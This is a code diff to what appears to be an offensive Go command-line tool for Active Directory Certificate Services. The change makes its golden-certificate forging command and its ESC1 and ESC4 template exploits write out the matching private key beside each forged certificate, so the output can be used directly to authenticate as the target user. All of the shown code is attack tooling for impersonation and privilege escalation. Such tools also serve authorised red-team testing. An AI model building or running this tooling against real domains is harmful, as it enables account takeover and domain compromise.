@@ -143,16 +143,19 @@ func runForge(cmd *cobra.Command) error {
 		}
 	}
 
-	cert, err := pki.ForgeCertificate(caKey, upn)
+	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
 	if err != nil {
 		return fmt.Errorf("forge certificate: %w", err)
 	}
 
-	if err := pki.WriteCertPEM(cert, output); err != nil {
+	// Strip .pem extension for base path if present
+	basePath := strings.TrimSuffix(output, ".pem")
+	basePath = strings.TrimSuffix(basePath, ".crt")
+	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
 		return fmt.Errorf("write certificate: %w", err)
 	}
 
-	fmt.Printf("[+] Golden certificate written to %s\n", output)
+	fmt.Printf("[+] Golden certificate written to %s.crt\n", basePath)
 	fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
 	fmt.Printf("    UPN: %s\n", upn)
 	fmt.Printf("    Serial: %s\n", cert.SerialNumber.String())
@@ -181,13 +184,14 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	}
 
 	var cert *x509.Certificate
+	var certKey *ecdsa.PrivateKey
 	var err error
 
 	switch strings.ToLower(exploit) {
 	case "esc1":
-		cert, err = pki.ExploitESC1(cfg, templateName, upn)
+		cert, certKey, err = pki.ExploitESC1(cfg, templateName, upn)
 	case "esc4":
-		cert, err = pki.ExploitESC4(cfg, templateName, upn)
+		cert, certKey, err = pki.ExploitESC4(cfg, templateName, upn)
 	default:
 		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc4)", exploit)
 	}
@@ -196,7 +200,9 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		return fmt.Errorf("exploitation failed: %w", err)
 	}
 
-	if err := pki.WriteCertPEM(cert, output); err != nil {
+	basePath := strings.TrimSuffix(output, ".pem")
+	basePath = strings.TrimSuffix(basePath, ".crt")
+	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
 		return fmt.Errorf("write cert: %w", err)
 	}
 
@@ -204,7 +210,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	fmt.Printf("    Exploit: %s\n", strings.ToUpper(exploit))
 	fmt.Printf("    Template: %s\n", templateName)
 	fmt.Printf("    UPN: %s\n", upn)
-	fmt.Printf("    Output: %s\n", output)
+	fmt.Printf("    Output: %s.crt / %s.key\n", basePath, basePath)
 	return nil
 }
 
